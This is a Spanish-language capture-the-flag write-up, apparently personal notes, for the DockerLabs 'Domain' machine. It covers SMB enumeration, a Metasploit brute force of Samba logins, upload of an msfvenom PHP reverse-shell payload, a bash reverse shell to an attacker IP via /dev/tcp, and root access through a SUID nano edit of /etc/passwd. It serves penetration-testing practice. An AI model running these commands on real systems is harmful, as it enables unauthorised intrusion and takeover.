---
tags:
  - Cybersecurity
  - Labs
  - DockerLabs
  - Linux
  - Samba
  - FileUpload
  - HTTP
  - SUID
---
- [[#Enumeración|Enumeración]]
	- [[#Enumeración#Ping|Ping]]
	- [[#Enumeración#Nmap|Nmap]]
- [[#Explotación|Explotación]]
	- [[#Explotación#Smbclient Anónimo|Smbclient Anónimo]]
	- [[#Explotación#Rpcclient|Rpcclient]]
	- [[#Explotación#Fuerza bruta con MSFconsole|Fuerza bruta con MSFconsole]]
	- [[#Explotación#Smbmap|Smbmap]]
	- [[#Explotación#Smbclient|Smbclient]]
	- [[#Explotación#HTTP|HTTP]]
	- [[#Explotación#SUID|SUID]]

---
# Resolviendo la máquina Domain

>En esta publicación, comparto cómo resolví la máquina **Domain** de [DockerLabs](https://dockerlabs.es/).

---
## Enumeración
### Ping

Ejecutamos un *ping* para comprobar la conectividad y obtener pistas sobre el sistema operativo.

`ping -c 1 172.17.0.2`

![[Pasted image 20250714190205.png]]

*TTL=64* -> **Linux**
### Nmap

`nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts`

![[Pasted image 20250714190428.png]]

`nmap -p80,139,445 -sCV 172.17.0.2 -oN targeted`

![[Pasted image 20250714190452.png]]

---
## Explotación
### Smbclient Anónimo

Se intenta acceder con usuario anónimo a **Samba**, el acceso anónimo no está habilitado.

`smbclient -L 172.17.0.2 -N`

![[Pasted image 20250714192221.png]]
### Rpcclient

`rpcclient -U "" -N 172.17.0.2`

![[Pasted image 20250714191606.png]]
### Fuerza bruta con MSFconsole

Se crea un archivo llamado *users* con los usuarios descubiertos.

`nano users`

![[Pasted image 20250714194246.png]]

Se utiliza un módulo de *Metasploit* para realizar fuerza bruta a **Samba**.

`auxiliary/scanner/smb/smb_login`

```
search auxiliary/scanner/smb/smb_login
use 0 | use auxiliary/scanner/smb/smb_login
show options
set RHOSTS 172.17.0.2
set USER_FILE /home/manumore/Escritorio/manumore/Laboratorios/DockerLabs/Domain/users
exploit
```

![[Pasted image 20250714194002.png]]

![[Pasted image 20250714194127.png]]
### Smbmap

Se listan los permisos que tenemos con el usuario *bob*, se observa que en *html* podemos leer y escribir.

`smbmap -u 'bob' -p 'star' -H 172.17.0.2`

![[Pasted image 20250714195358.png]]
### Smbclient

`smbclient -U 'bob' //172.17.0.2/html`

![[Pasted image 20250714202137.png]]

Al tener permisos para escribir, se crea y se sube un *payload malicioso*.

`msfvenom -p php/reverse_php LHOST=192.168.1.127 LPORT=444 -f raw > pwned.php`

`put pwned.php`

![[Pasted image 20250714202336.png]]
### HTTP

Se realiza una escucha en los puertos 444 y 4444.

`nc -nlvp 444`

`nc -nlvp 4444`

Se ejecuta el *payload* subido anteriormente.

`http://172.17.0.2/pwned.php`

Se establece una *reverse shell* para mantener el acceso persistente

`bash -c "sh -i >& /dev/tcp/192.168.1.127/4444 0>&1"`

![[Pasted image 20250714202644.png]]

Se realiza el tratamiento de la terminal.

```bash
script /dev/null -c bash
Ctrl + Z
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=bash
```

![[Pasted image 20250714202818.png]]
### SUID

Se realiza una búsqueda de permisos **SUID**.

`find / -perm -4000 2>/dev/null`

![[Pasted image 20250714203019.png]]

Se observa un permiso sospechoso: *usr/bin/nano*. Se realiza una búsqueda por [GTFOBins](https://gtfobins.github.io/gtfobins/nano/#limited-suid).

![[Pasted image 20250714203105.png]]

Una de las formas de escalar privilegios con *nano*, es modificar el fichero `/etc/passwd`.

Se modifica el archivo `/etc/passwd` eliminando la contraseña de *root*, permitiendo el acceso directo sin autenticación.

`cat /etc/passwd`

![[Pasted image 20250714203247.png]]

`nano /etc/passwd`

`cat /etc/passwd`

![[Pasted image 20250714203411.png]]

`su root`

![[Pasted image 20250714203457.png]]

---